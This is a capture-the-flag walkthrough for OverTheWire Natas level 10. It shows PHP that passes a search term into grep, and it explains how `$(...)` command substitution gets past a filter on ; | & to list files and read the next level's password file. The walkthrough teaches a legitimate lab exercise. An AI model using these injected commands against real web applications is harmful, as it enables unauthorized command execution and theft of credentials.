## Natas Level 10

- URL: http://natas10.natas.labs.overthewire.org

- Open the website
- Check the source code
```
    <pre>
        <?
        $key = "";

        if(array_key_exists("needle", $_REQUEST)) {
            $key = $_REQUEST["needle"];
        }

        if($key != "") {
            if(preg_match('/[;|&]/',$key)) {
                print "Input contains an illegal character!";
            } else {
                passthru("grep -i $key dictionary.txt");
            }
        }
        ?>
    </pre>
```

- Since the characters `; | &` are blocked we have to try something different

- We can use substitution in commands `$()` to try to bypass the filter

- Enter the search term `$ (ls)` and we get some output
```
    index-source.html:<html>
    <head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
    ...
```

- Find the file with the natas11 password
- `$(find / -name natas11 2>/dev/null) -v`

```
    >! /etc/natas_webpass/natas11:[Level 11 Password]
    dictionary.txt:
    dictionary.txt:African
    dictionary.txt:Africans
    dictionary.txt:Allah
    ...
```

- The resulting command would be `grep path_to_file -v`
- The -v is there to show us the lines that did not much along with the path at the top

- The password is at the end of the filename